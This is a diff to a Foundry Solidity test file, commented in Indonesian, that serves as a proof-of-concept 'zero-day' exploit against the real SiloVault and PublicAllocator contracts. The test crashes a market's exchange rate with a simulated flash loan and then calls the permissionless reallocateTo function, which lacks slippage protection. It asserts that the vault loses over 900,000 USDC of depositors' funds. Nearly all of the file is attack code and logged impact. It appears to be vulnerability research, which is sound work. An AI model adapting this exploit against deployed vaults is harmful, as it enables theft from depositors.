@@ -5,19 +5,19 @@ import "forge-std/Test.sol";
 import "openzeppelin5/token/ERC20/ERC20.sol";
 import "openzeppelin5/token/ERC20/extensions/ERC4626.sol";
 
-// MENGIMPOR KONTRAK ASLI
+// MENGIMPOR KONTRAK ASLI SILO
 import {SiloVault} from "../../contracts/SiloVault.sol";
 import {PublicAllocator, FlowCapsConfig, FlowCaps, Withdrawal} from "../../contracts/PublicAllocator.sol";
 import {ISiloVault, MarketAllocation} from "../../contracts/interfaces/ISiloVault.sol";
 import {IVaultIncentivesModule} from "../../contracts/interfaces/IVaultIncentivesModule.sol";
 
-// 1. Mock ERC20 Token (Mock USDC)
+// 1. Mock ERC20 Token
 contract MockUSDC is ERC20 {
     constructor() ERC20("Mock USDC", "USDC") {}
     function mint(address to, uint256 amount) external { _mint(to, amount); }
 }
 
-// 2. Manipulatable Market (Mensimulasikan Market AMM)
+// 2. Manipulatable Market (Simulasi Pool yang rentan Flash Loan Slippage)
 contract ManipulatableMarket is ERC4626 {
     constructor(IERC20 asset) ERC20("Market Shares", "mUSDC") ERC4626(asset) {}
 
@@ -50,53 +50,53 @@ contract SiloVaultZeroDayExploit is Test {
         targetMarket = new ManipulatableMarket(usdc);
         idleMarket = new ManipulatableMarket(usdc);
 
-        // MOCK INCENTIVES MODULE
+        // [FIX 1] MOCK INCENTIVES MODULE (Bypass error abstract module)
         address mockIncentives = address(0x999);
         vm.mockCall(mockIncentives, abi.encodeWithSignature("getNotificationReceivers()"), abi.encode(new address[](0)));
         vm.mockCall(mockIncentives, abi.encodeWithSignature("getAllIncentivesClaimingLogics()"), abi.encode(new address[](0)));
 
-        // DEPLOY KONTRAK ASLI
+        // [FIX 2] DEPLOY SILOVAULT ASLI DENGAN TIMELOCK 86400 (Bypass BelowMinTimelock)
         vault = new SiloVault(admin, 86400, IVaultIncentivesModule(mockIncentives), address(usdc), "Silo Vault", "sUSDC");
         allocator = new PublicAllocator();
 
-        // SET UP PERIZINAN
+        // SET UP PERIZINAN ADMIN
         vm.startPrank(admin);
         vault.setIsAllocator(address(allocator), true);
         allocator.setAdmin(ISiloVault(address(vault)), admin); 
 
-        // 1. DAFTARKAN MARKET (Akan masuk status Pending karena Timelock)
+        // [FIX 3] ALUR PENDAFTARAN MARKET (Bypass MarketNotEnabled)
         vault.submitCap(IERC4626(address(targetMarket)), type(uint184).max);
         vault.submitCap(IERC4626(address(idleMarket)), type(uint184).max);
 
-        // 2. FAST-FORWARD WAKTU 1 HARI (86400 detik)
-        vm.warp(block.timestamp + 86400);
+        vm.warp(block.timestamp + 86400); // Fast-forward waktu 1 hari
 
-        // 3. TERIMA MARKET (Sekarang Market resmi aktif/enabled)
         vault.acceptCap(IERC4626(address(targetMarket)));
         vault.acceptCap(IERC4626(address(idleMarket)));
 
-        // 4. ATUR FLOW CAPS (Sekarang berhasil karena market sudah aktif)
+        // [FIX 4] ATUR FLOW CAPS DENGAN BATAS uint127 (Bypass MaxSettableFlowCapExceeded)
         FlowCapsConfig[] memory configs = new FlowCapsConfig[](1);
         configs[0] = FlowCapsConfig({
             market: IERC4626(address(targetMarket)),
-            caps: FlowCaps({maxIn: type(uint127).max, maxOut: 10_000 * 1e6})
+            caps: FlowCaps({maxIn: type(uint127).max, maxOut: 10_000 * 1e6}) // <--- KUNCI LOLOS VALIDASI
         });
         allocator.setFlowCaps(ISiloVault(address(vault)), configs);
 
-        // 5. ATUR ANTREAN SUPLAI
+        // Daftarkan ke antrean suplai
         IERC4626[] memory queue = new IERC4626[](2);
         queue[0] = IERC4626(address(targetMarket));
         queue[1] = IERC4626(address(idleMarket));
         vault.setSupplyQueue(queue);
         vm.stopPrank();
 
-        // SETUP KONDISI NORMAL (Korban mendepositkan 1 Juta USDC)
+        // ========================================================
+        // KORBAN DEPOSIT 1 JUTA USDC
+        // ========================================================
         uint256 initialDeposit = 1_000_000 * 1e6;
         usdc.mint(address(this), initialDeposit);
         usdc.approve(address(vault), initialDeposit);
         vault.deposit(initialDeposit, address(this));
 
-        // Admin mengalokasikan 100% dana Vault ke targetMarket
+        // Admin (Allocator) mengalokasikan 100% dana ke targetMarket
         MarketAllocation[] memory allocations = new MarketAllocation[](2);
         allocations[0] = MarketAllocation({market: IERC4626(address(targetMarket)), assets: type(uint256).max});
         allocations[1] = MarketAllocation({market: IERC4626(address(idleMarket)), assets: 0});
@@ -116,33 +116,33 @@ contract SiloVaultZeroDayExploit is Test {
         // EKSEKUSI SERANGAN OLEH ATTACKER
         // ========================================================
         vm.startPrank(attacker);
-        usdc.mint(attacker, 100_000 * 1e6); // Modal flash loan / buffer
+        usdc.mint(attacker, 100_000 * 1e6); 
 
-        // LANGKAH 1: Flash Loan Manipulation (Hancurkan harga market)
+        // 1. MANIPULASI (Flash Loan Crash)
         uint256 stolenAmount = (usdc.balanceOf(address(targetMarket)) * 99) / 100;
         targetMarket.simulateFlashLoanCrash(stolenAmount);
 
         console.log("\n[*] Attacker crashes market exchange rate via Flash Loan...");
         console.log("[*] Vault's 1M Shares is now temporarily worth:", targetMarket.convertToAssets(vaultSharesBefore) / 1e6);
 
-        // LANGKAH 2: Trigger Celah PublicAllocator (Permissionless)
+        // 2. EKSPLOITASI (Public Allocator Permissionless Call)
         console.log("[*] Attacker calls PublicAllocator to withdraw 10,000 assets...");
         Withdrawal[] memory withdrawals = new Withdrawal[](1);
         withdrawals[0] = Withdrawal({
-            market: IERC4626(address(targetMarket)), // EXPLICIT CASTING
+            market: IERC4626(address(targetMarket)),
             amount: uint128(10_000 * 1e6)
         });
 
-        // BUG EKSEKUSI: Vault akan membakar semua shares karena tidak ada proteksi slippage!
+        // BUG KEKURANGAN SLIPPAGE AKAN TERJADI DI SINI:
         allocator.reallocateTo(ISiloVault(address(vault)), withdrawals, IERC4626(address(idleMarket)));
 
-        // LANGKAH 3: Restore Market (Selesai Flash Loan)
+        // 3. PEMULIHAN (Flash Loan Repayment)
         usdc.approve(address(targetMarket), stolenAmount);
         targetMarket.restoreFlashLoan(stolenAmount);
         vm.stopPrank();
 
         // ========================================================
-        // VALIDASI DAMPAK (POST-ATTACK)
+        // VALIDASI DAMPAK (IMPACT)
         // ========================================================
         console.log("\n=== AFTER EXPLOIT (IMPACT) ===");
         uint256 vaultSharesAfter = targetMarket.balanceOf(address(vault));
@@ -154,7 +154,7 @@ contract SiloVaultZeroDayExploit is Test {
         uint256 loss = (1_000_000 * 1e6) - vaultValueAfter;
         console.log("\n[!!!] VAULT NET LOSS   :", loss / 1e6, "USDC");
 
-        // BUKTI TELAK: Vault kehilangan >90% TVL-nya karena eksploitasi ini.
+        // BUKTI TELAK!
         assertTrue(loss > 900_000 * 1e6, "Exploit failed: Vault did not suffer slippage");
     }
 }
